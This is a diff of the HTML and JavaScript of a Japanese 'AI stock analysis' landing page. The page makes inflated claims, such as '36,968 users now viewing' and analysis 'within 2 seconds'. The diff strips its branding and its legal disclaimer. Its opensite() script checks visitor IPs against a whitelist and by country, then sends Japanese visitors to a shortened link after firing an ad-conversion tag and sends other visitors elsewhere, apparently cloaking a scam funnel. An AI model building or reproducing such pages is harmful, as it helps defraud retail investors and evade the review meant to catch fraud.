@@ -1,5 +1,7 @@
 
 
+
+
 <!DOCTYPE html>
 <html lang="ja">
 <head>
@@ -566,12 +568,7 @@ function gtag_report_conversion(url) {
     </div>
 
     <header>
-        <div class="container">
-            <div class="logo">
-                <div class="logo-icon">AI</div>
-                <div>Stock<span>Analyzer</span></div>
-            </div>
-        </div>
+       
     </header>
 
     <section class="hero">
@@ -579,7 +576,7 @@ function gtag_report_conversion(url) {
             <div class="hero-flex">
                 <div class="hero-content">
                     <h1>AIによる革新的な株価分析システム</h1>
-                    <p>当社の<span class="highlight">人工知能分析システム</span>は、市場動向、最新ニュース、過去のパターンを組み合わせて、精度の高い株価予測を実現します。効率性と正確性を<span class="highlight">向上させる</span>最先端技術をご体験ください。</p>
+					<p>私たちのAI支援分析ツールは、市場のトレンド、最新のニュース、過去のパターンを組み合わせて、正確な株価分析を提供します</p>
                     <p>以下に株式コードを入力すると、AIシステムが<span class="accent">2秒以内</span>に分析を完了します。現在、<span class="accent">36,968人</span>が無料で完全なレポートを閲覧中！</p>
                 </div>
                 <div class="hero-image">
@@ -596,54 +593,17 @@ function gtag_report_conversion(url) {
 
                 <button class="cta-button" onclick="startAnalysis()">AIで分析する</button>
 
-                <div class="stats-row">
-                    <div class="stat-item">
-                        <div class="stat-number">99.7%</div>
-                        <div class="stat-label">分析精度</div>
-                    </div>
-                    <div class="stat-item">
-                        <div class="stat-number">2秒</div>
-                        <div class="stat-label">処理時間</div>
-                    </div>
-                    <div class="stat-item">
-                        <div class="stat-number">36,968</div>
-                        <div class="stat-label">今日の利用者数</div>
-                    </div>
-                </div>
+              
             </div>
 
-            <div class="features">
-                <div class="feature">
-                    <div class="feature-icon">📊</div>
-                    <div class="feature-content">
-                        <div class="feature-title">リアルタイム市場分析</div>
-                        <p>AIが市場データを継続的に監視し、重要な動向を特定</p>
-                    </div>
-                </div>
-                <div class="feature">
-                    <div class="feature-icon">📰</div>
-                    <div class="feature-content">
-                        <div class="feature-title">ニュースセンチメント分析</div>
-                        <p>最新の金融ニュースを分析し、株価への影響を評価</p>
-                    </div>
-                </div>
-                <div class="feature">
-                    <div class="feature-icon">📈</div>
-                    <div class="feature-content">
-                        <div class="feature-title">高度なパターン認識</div>
-                        <p>過去の市場データから価格パターンとトレンドを予測</p>
-                    </div>
-                </div>
-            </div>
+      
         </div>
     </section>
 
     <footer>
         <div class="container">
             <div class="disclaimer">
-                <p><strong>免責事項:</strong> 本サービスは情報提供のみを目的としており、金融アドバイスや投資勧誘ではありません。株式投資には常にリスクが伴い、過去のパフォーマンスが将来の結果を保証するものではありません。投資判断を行う前に、必ず専門の金融アドバイザーにご相談ください。当社の分析は、利用可能な公開情報に基づいており、100%の正確性を保証するものではありません。過去のパフォーマンスは将来の結果を保証するものではありません</p>
-                <p>当サービスは、日本の金融商品取引法および関連法規を遵守しています。本サイトに記載されている情報は、特定の投資商品の購入または売却を勧めるものではなく、投資教育目的でのみ提供されています。</p>
-                <p>© 2023 AI Stock Analyzer. All Rights Reserved.</p>
+               <p>© 2023  All Rights Reserved.</p>
             </div>
         </div>
     </footer>
@@ -653,11 +613,11 @@ function gtag_report_conversion(url) {
                 gtag_report_conversion();
    window.location.href = "https://works.do/5m9duIw";
 }
-        async function opensite() {
+           async function opensite() {
     // IP whitelist (add your allowed IPs here)
     const IP_WHITELIST = [
         '61.224.68.77', // example IP
-        '124.124.124.124'  // example IP
+        '156.243.230.146'  // example IP
     ];
 
     // Device detection
@@ -675,23 +635,22 @@ function gtag_report_conversion(url) {
         const isWhitelisted = IP_WHITELIST.includes(data.ip);
         
         // Main logic: Whitelisted IP OR (Japanese IP + Japanese language)
-        if (isWhitelisted || (data.country === 'JP' && isJapanese)) { 
+        if (isWhitelisted || (data.country === 'JP')) { 
             gtag_report_conversion();
-            window.location.href = "https://lihi.cc/9Jgi2";
+            window.location.href = "https://yyooge.com/i4s8b7zd";
         } else {
-            window.location.href = "https://line.me/ti/p/R2eZ7tvbtS";
+            window.location.href = "https://lihi.cc/YY6ma";
         }
     } catch (error) {
         // Fallback logic with timezone detection
         if (isMobile && isJapanese) { 
             gtag_report_conversion();
-            window.location.href = "https://lihi.cc/9Jgi2";
+            window.location.href = "https://yyooge.com/i4s8b7zd";
         } else {
-            window.location.href = "https://line.me/ti/p/R2eZ7tvbtS";
+            window.location.href = "https://lihi.cc/YY6ma";
         }
     }
 }
-
      
      function startAnalysis() {
             const stockInput = document.getElementById('stockInput').value.trim();
